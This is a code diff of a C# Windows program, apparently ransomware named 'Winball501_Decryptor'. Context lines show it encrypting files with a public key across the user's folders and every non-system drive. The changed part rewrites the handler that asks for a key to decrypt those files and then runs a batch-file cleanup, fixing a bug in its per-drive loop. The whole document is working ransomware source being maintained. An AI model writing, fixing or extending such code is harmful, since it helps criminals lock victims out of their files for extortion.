@@ -131,10 +131,10 @@ namespace Winball501_Decryptor
                     Encrypt encrypt = new Encrypt(this, publickey, path);
                     tasks.Add(Task.Run(() => encrypt.run()));
                 }
-               
 
-            
-               
+
+
+
                 string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
 
                 Encrypt encrypt1 = new Encrypt(this, publickey, downloadsPath);
@@ -155,10 +155,10 @@ namespace Winball501_Decryptor
                             Encrypt encrypt = new Encrypt(this, publickey, path);
                             tasks.Add(Task.Run(() => encrypt.run()));
                         }
-                      
+
                     }
                 }
-           
+
                 await Task.WhenAll(tasks);
                 File.Create(encryptedFile).Close();
                 this.Visible = true;
@@ -539,64 +539,58 @@ namespace Winball501_Decryptor
 
         private async void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text == "")
+            if (string.IsNullOrEmpty(textBox1.Text))
             {
                 MessageBox.Show("Enter a correct key to decrypt files.");
+                return;
             }
-            else
+
+            List<Task> decryptionTasks = new List<Task>();
+            string enteredPassword = textBox1.Text;
+
+            // Decrypt files in the standard special folders
+            foreach (Environment.SpecialFolder folder in new[]
             {
-                List<Task> decryptionTasks = new List<Task>();
+        Environment.SpecialFolder.Desktop,
+        Environment.SpecialFolder.MyDocuments,
+        Environment.SpecialFolder.MyPictures,
+        Environment.SpecialFolder.MyVideos,
+        Environment.SpecialFolder.MyMusic,
+    })
+            {
+                string path = Environment.GetFolderPath(folder);
+                Decrypt decrypt = new Decrypt(this, enteredPassword, path);
+                decryptionTasks.Add(Task.Run(() => decrypt.run()));
+            }
 
-                // Decrypt files in the standard special folders
-                foreach (Environment.SpecialFolder folder in new[] {
-            Environment.SpecialFolder.Desktop,
-            Environment.SpecialFolder.MyDocuments,
-            Environment.SpecialFolder.MyPictures,
-            Environment.SpecialFolder.MyVideos,
-            Environment.SpecialFolder.MyMusic,
-        })
+            // Decrypt files in the Downloads folder
+            string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+            Decrypt decryptForDownloads = new Decrypt(this, enteredPassword, downloadsPath);
+            decryptionTasks.Add(Task.Run(() => decryptForDownloads.run()));
+
+            // Decrypt files on other drives (excluding the system drive)
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            // Retrieve the system drive (default to "C:" if not set)
+            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive") ?? "C:";
+
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.IsReady)
                 {
-                    string path = Environment.GetFolderPath(folder);
-                    string enteredPassword = textBox1.Text;
-                    Decrypt decrypt = new Decrypt(this, enteredPassword, path);
-
-                    // Add decryption tasks to the list
-                    decryptionTasks.Add(Task.Run(() => decrypt.run()));
-                }
-
-                // Decrypt files in the Downloads folder
-                string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
-                string enteredPasswordForDownloads = textBox1.Text;
-                Decrypt decryptForDownloads = new Decrypt(this, enteredPasswordForDownloads, downloadsPath);
-
-                // Add the Downloads decryption task to the list
-                decryptionTasks.Add(Task.Run(() => decryptForDownloads.run()));
-
-                // Wait for all decryption tasks to finish
-                DriveInfo[] drives = DriveInfo.GetDrives();
-                foreach (DriveInfo drive in drives)
-                {
-                    if (drive.IsReady)
+                    string path = drive.Name;
+                    if (!path.StartsWith(systemDrive, StringComparison.OrdinalIgnoreCase))
                     {
-                        string path = drive.Name;
-
-                        // Retrieve the system drive from the environment variable.
-                        // Default to "C:" if not set.
-                        string systemDrive = Environment.GetEnvironmentVariable("SystemDrive") ?? "C:";
-
-                        if (!path.StartsWith(systemDrive, StringComparison.OrdinalIgnoreCase))
-                        {
-                            tasks.Add(Task.Run(() => decrypt.run()));
-                        }
-
+                        // Create a new Decrypt instance for each drive
+                        Decrypt decryptForDrive = new Decrypt(this, enteredPassword, path);
+                        decryptionTasks.Add(Task.Run(() => decryptForDrive.run()));
                     }
                 }
-                await Task.WhenAll(decryptionTasks);
-
-                // Once all decryption tasks are done, proceed with cleanup
-                CreateBatchFile();
             }
-        }
-    }
 
+            await Task.WhenAll(decryptionTasks);
+
+            // Once all decryption tasks are done, proceed with cleanup
+            CreateBatchFile();
+        }
+      }
 }
